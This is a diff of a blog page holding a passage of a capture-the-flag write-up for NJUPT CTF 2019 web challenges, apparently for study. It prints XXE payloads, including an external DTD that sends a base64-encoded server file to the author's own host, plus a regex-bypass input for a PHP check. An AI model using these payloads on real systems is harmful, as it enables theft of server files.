@@ -1,664 +1,978 @@
-<!DOCTYPE html>
-
-
-
-
-
+<!DOCTYPE HTML>
 <html lang="en">
+
+
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 4.0.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.2">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.2">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.2">
-  <link rel="mask-icon" href="/images/logo.svg?v=7.4.2" color="#222">
-
-<link rel="stylesheet" href="/css/main.css?v=7.4.2">
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="NJUPT CTF 2019 web部分writeup, 念念不忘，必有回响">
+    <meta name="description" content="念念不忘，必有回响">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-<script id="hexo-configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Pisces',
-    version: '7.4.2',
-    exturl: false,
-    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
-    copycode: {"enable":false,"show_result":false,"style":null},
-    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
-    bookmark: {"enable":false,"color":"#222","save":"auto"},
-    fancybox: false,
-    mediumzoom: false,
-    lazyload: false,
-    pangu: false,
-    algolia: {
-      appID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    },
-    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
-    path: 'search.xml',
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    translation: {
-      copy_button: 'Copy',
-      copy_success: 'Copied',
-      copy_failure: 'Copy failed'
-    },
-    sidebarPadding: 40
-  };
-</script>
+    <title>NJUPT CTF 2019 web部分writeup | LiM&#39;s blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
 
-  <meta name="description" content="题目挺好玩的，很多不会，慢慢写还是有点思路的，学到了很多新知识。Fake XML cookbook测试了一下，没有回显，所以进行参数实体的注入，在vps上放一个xml文件，让它加载，文件内容如下1&amp;lt;!ENTITY % payload &quot;&amp;lt;!ENTITY &amp;amp;#x25; send SYSTEM &amp;apos;http:&#x2F;&#x2F;47.103.62.94:8080&#x2F;?content=%file;&amp;apos;&amp;g">
-<meta name="keywords" content="CTF,web">
-<meta property="og:type" content="article">
-<meta property="og:title" content="NJUPT CTF 2019 web部分writeup">
-<meta property="og:url" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;11&#x2F;24&#x2F;NJUPT%20CTF%202019%20web%E9%83%A8%E5%88%86writeup&#x2F;index.html">
-<meta property="og:site_name" content="LiM&#39;s blog">
-<meta property="og:description" content="题目挺好玩的，很多不会，慢慢写还是有点思路的，学到了很多新知识。Fake XML cookbook测试了一下，没有回显，所以进行参数实体的注入，在vps上放一个xml文件，让它加载，文件内容如下1&amp;lt;!ENTITY % payload &quot;&amp;lt;!ENTITY &amp;amp;#x25; send SYSTEM &amp;apos;http:&#x2F;&#x2F;47.103.62.94:8080&#x2F;?content=%file;&amp;apos;&amp;g">
-<meta property="og:locale" content="en">
-<meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;11&#x2F;24&#x2F;NJUPT%20CTF%202019%20web%E9%83%A8%E5%88%86writeup&#x2F;1574587789404.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;11&#x2F;24&#x2F;NJUPT%20CTF%202019%20web%E9%83%A8%E5%88%86writeup&#x2F;1574588638162.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;11&#x2F;24&#x2F;NJUPT%20CTF%202019%20web%E9%83%A8%E5%88%86writeup&#x2F;1574779072769.png">
-<meta property="og:updated_time" content="2019-11-28T12:40:02.667Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;11&#x2F;24&#x2F;NJUPT%20CTF%202019%20web%E9%83%A8%E5%88%86writeup&#x2F;1574587789404.png">
-  <link rel="canonical" href="https://li1m.github.io/2019/11/24/NJUPT%20CTF%202019%20web%E9%83%A8%E5%88%86writeup/">
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+    
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
 
 
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome: false,
-    isPost: true,
-    isPage: false,
-    isArchive: false
-  };
-</script>
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">LiM's blog</span>
+                </a>
+            </div>
+            
 
-  <title>NJUPT CTF 2019 web部分writeup | LiM's blog</title>
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
   
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>Index</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>Tags</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>Archives</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>About</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>Friends</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
 
+<div id="mobile-nav" class="side-nav sidenav">
 
-
-
-
-
-
-
-  <noscript>
-  <style>
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
-
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
-
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div class="container use-motion">
-    <div class="headband"></div>
-
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-meta">
-
-    <div>
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">LiM's blog</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">LiM's blog</div>
+        <div class="logo-desc">
+            
+            念念不忘，必有回响
+            
+        </div>
     </div>
-  </div>
 
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="Toggle navigation bar">
-      <span class="toggle-line toggle-line-first"></span>
-      <span class="toggle-line toggle-line-middle"></span>
-      <span class="toggle-line toggle-line-last"></span>
-    </div>
-  </div>
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			Index
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			Tags
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			Archives
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			About
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			Friends
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
 </div>
-
-
-<nav class="site-nav">
-  
-  <ul id="menu" class="menu">
-      
-      
-        
-        
-        <li class="menu-item menu-item-home">
-      
-    
-
-    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
-
-  </li>
-      
-    
-      
-      
-        
-        
-        <li class="menu-item menu-item-about">
-      
-    
-
-    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>
-
-  </li>
-      
-    
-      
-      
-        
-        
-        <li class="menu-item menu-item-tags">
-      
-    
-
-    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
-
-  </li>
-      
-    
-      
-      
-        
-        
-        <li class="menu-item menu-item-archives">
-      
-    
-
-    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
-
-  </li>
-      
-    
-      
-      
-        
-        
-        <li class="menu-item menu-item-friends">
-      
-    
-
-    <a href="/friends/" rel="section"><i class="fa fa-fw fa-paw"></i>friends</a>
-
-  </li>
-      
-    
-      <li class="menu-item menu-item-search">
-        <a role="button" class="popup-trigger">
-          <i class="fa fa-search fa-fw"></i>Search
-        </a>
-      </li>
-    
-  </ul>
-
-</nav>
-  <div class="site-search">
-    <div class="popup search-popup">
-    <div class="search-header">
-  <span class="search-icon">
-    <i class="fa fa-search"></i>
-  </span>
-  <div class="search-input-container">
-    <input autocomplete="off" autocorrect="off" autocapitalize="none"
-           placeholder="Searching..." spellcheck="false"
-           type="text" id="search-input">
-  </div>
-  <span class="popup-btn-close">
-    <i class="fa fa-times-circle"></i>
-  </span>
-</div>
-<div id="search-result"></div>
-
-</div>
-<div class="search-pop-overlay"></div>
-
-  </div>
-</div>
-    </header>
-
-    
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-
-
-    <main class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-            
-
-          <div class="content">
-            
-
-  <div class="posts-expand">
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
-    <link itemprop="mainEntityOfPage" href="https://Li1M.github.io/2019/11/24/NJUPT%20CTF%202019%20web%E9%83%A8%E5%88%86writeup/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="LiM">
-      <meta itemprop="description" content="念念不忘，必有回响">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="LiM's blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            NJUPT CTF 2019 web部分writeup
-            
-
-          
-        </h1>
-
-        <div class="post-meta">
-           
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              
-                
-              
-
-              <time title="Created: 2019-11-24 17:12:47" itemprop="dateCreated datePublished" datetime="2019-11-24T17:12:47+08:00">2019-11-24</time>
-            </span>
-          
-            
-
-            
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2019-11-28 20:40:02" itemprop="dateModified" datetime="2019-11-28T20:40:02+08:00">2019-11-28</time>
-              </span>
-            
-          
-
-          
-            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">Views: </span>
-              <span id="busuanzi_value_page_pv"></span>
-            </span>
-          
-          <br>
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-file-word-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Symbols count in article: </span>
-              
-              <span>6k</span>
-            </span>
-          
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-clock-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Reading time &asymp;</span>
-              
-              <span>5 mins.</span>
-            </span>
-          
 
         </div>
-      </header>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
 
     
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">NJUPT CTF 2019 web部分writeup</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
     
-    
-    <div class="post-body" itemprop="articleBody">
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
 
-      
-        <p>题目挺好玩的，很多不会，慢慢写还是有点思路的，学到了很多新知识。</p><h1 id="Fake-XML-cookbook"><a href="#Fake-XML-cookbook" class="headerlink" title="Fake XML cookbook"></a>Fake XML cookbook</h1><p>测试了一下，没有回显，所以进行参数实体的注入，在vps上放一个xml文件，让它加载，文件内容如下</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % payload "&lt;!ENTITY &amp;#x25; send SYSTEM 'http://47.103.62.94:8080/?content=%file;'&gt;"&gt; %payload;</span><br></pre></td></tr></table></figure><a id="more"></a>
+    #articleContent :focus {
+        outline: none;
+    }
 
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
 
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
 
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/CTF/">
+                                <span class="chip bg-color">CTF</span>
+                            </a>
+                        
+                            <a href="/tags/web/">
+                                <span class="chip bg-color">web</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
+                    2019-11-24
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
+                    2019-11-28
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
+                    1.7k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
+                    8 Min
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>Read Count:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>题目挺好玩的，很多不会，慢慢写还是有点思路的，学到了很多新知识。</p>
+<h1 id="Fake-XML-cookbook"><a href="#Fake-XML-cookbook" class="headerlink" title="Fake XML cookbook"></a>Fake XML cookbook</h1><p>测试了一下，没有回显，所以进行参数实体的注入，在vps上放一个xml文件，让它加载，文件内容如下</p>
+<pre class=" language-xml"><code class="language-xml">&lt;!ENTITY % payload "&lt;!ENTITY <span class="token entity" title="&#x25;">&amp;#x25;</span> send SYSTEM 'http://47.103.62.94:8080/?content=%file;'>"> %payload;</code></pre>
 <p>因为题目提示了flag is in /flag，所以构造请求的xml内容如下</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span> &lt;!DOCTYPE test[ &lt;!ENTITY % file SYSTEM <span class="string">"php://filter/read=convert.base64-encode/resource=../../../flag"</span>&gt; &lt;!ENTITY % dtd SYSTEM <span class="string">"http://47.103.62.94:8080/evil.xml"</span>&gt; %dtd; %send; ]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">  &lt;username&gt;<span class="number">1</span>&lt;/username&gt;</span><br><span class="line">  &lt;password&gt;<span class="number">1</span>&lt;/password&gt;</span><br><span class="line">  &lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure>
-
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?</span>xml version<span class="token operator">=</span><span class="token string">"1.0"</span><span class="token delimiter">?></span> <span class="token markup"><span class="token doctype">&lt;!DOCTYPE test[ &lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=../../../flag"></span></span> <span class="token markup">&lt;!ENTITY % dtd SYSTEM "http://47.103.62.94:8080/evil.xml"></span> <span class="token operator">%</span>dtd<span class="token punctuation">;</span> <span class="token operator">%</span>send<span class="token punctuation">;</span> <span class="token punctuation">]</span><span class="token operator">></span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span></span>
+  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span></span><span class="token number">1</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span></span>
+  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span></span><span class="token number">1</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span></span>
+  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span></span><span class="token operator">&amp;</span>xxe<span class="token punctuation">;</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span></span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span></span></code></pre>
 <p><img src="1574587789404.png" alt="1574587789404"></p>
 <p>最后把content的内容base64解码即是flag</p>
 <p>ps.补充一下，后来看大佬们的解决方法是存在回显的，如下构造payload即可看到回显。</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY xxe SYSTEM "file:///flag"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">username</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">password</span>&gt;</span>1<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span>
+<span class="token doctype">&lt;!DOCTYPE ANY [
+    &lt;!ENTITY xxe SYSTEM "file:///flag"></span>
+]>
 
-
-
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span></code></pre>
 <h1 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h1><p>是一个函数绕过题，挺好玩的，</p>
 <p>1st</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'num'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, $_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'1st ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'23333333'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'23333'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^23333$/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token string">'1st ok'</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'23333333'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> </code></pre>
 <p>可以给num传23333%0a就可以绕过%0a是换行的意思</p>
 <p>2nd</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(is_numeric($string_1))&#123;</span><br><span class="line">    $md5_1 = md5($string_1);</span><br><span class="line">    $md5_2 = md5($string_2);</span><br><span class="line">    <span class="keyword">if</span>($md5_1 != $md5_2)&#123;</span><br><span class="line">        $a = strtr($md5_1, <span class="string">'cxhp'</span>, <span class="string">'0123'</span>);</span><br><span class="line">        $b = strtr($md5_2, <span 